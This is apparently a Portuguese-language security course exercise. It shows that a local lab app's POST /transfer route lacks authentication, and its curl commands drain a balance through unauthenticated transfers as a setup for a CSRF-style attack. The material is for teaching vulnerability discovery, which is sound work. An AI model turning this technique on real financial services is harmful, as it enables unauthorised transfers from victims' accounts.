## Módulo 01 / Exercício 01 - Payloads

Uma forma de identificar uma possível vulnerabilidade é verificar como a aplicação web realiza chamadas aos serviços de backend.

Para esse exercício, foi verificado que a rota POST http://localhost:8080/transfer não possui qualquer mecanismo de autenticação. 

Isso permite que qualquer atacante possa criar uma forma de forçar a vítima a executar alguma página que ele entenda ser confiável, mas que no fundo esteja realizando operações indesejadas.

Com os comandos abaixo é possível verificar que o saldo é descontado a cada requisição feita.

Recuperar o saldo:

    curl -X GET http://localhost:8080/balance


Realizar uma transferência sem qualquer mecanismo de autenticação.

    curl -X POST http://localhost:8080/transfer -d amount=100


Recuperar o saldo e verificar que foi descontado o valor 100:

    curl -X GET http://localhost:8080/balance


Realizar uma nova transferência sem qualquer mecanismo de autenticação.

    curl -X POST http://localhost:8080/transfer -d amount=900


Recuperar o saldo e verificar que o saldo foi zerado:

    curl -X GET http://localhost:8080/balance

